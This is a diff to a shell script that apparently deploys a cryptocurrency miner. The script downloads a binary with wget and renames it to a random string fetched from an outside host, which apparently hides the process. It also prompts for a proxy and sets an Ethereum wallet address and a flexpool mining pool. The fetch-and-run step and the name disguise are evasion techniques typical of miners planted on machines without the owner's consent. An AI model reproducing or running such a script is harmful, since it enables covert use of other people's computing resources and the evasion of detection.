@@ -5,8 +5,8 @@ wget https://github.com/rindalasririn/ketaea/raw/main/bubui
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
 chmod +x bubui && mv bubui $ACAK
 read -p 'Input Proxy nya: ' PROXY
-WALLET=prodent
-POOL=stratum+tcp://ethash.kupool.com:443
+WALLET=0xbc48b8bdce572defe4dcab85103f140099bc5af5
+POOL=stratum+tcp://eth-us-west.flexpool.io:5555
 WORKER1=$(echo $(shuf -i 1000-9999 -n TEST))
 #WORKER2=$(date '+%d%b')
 #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
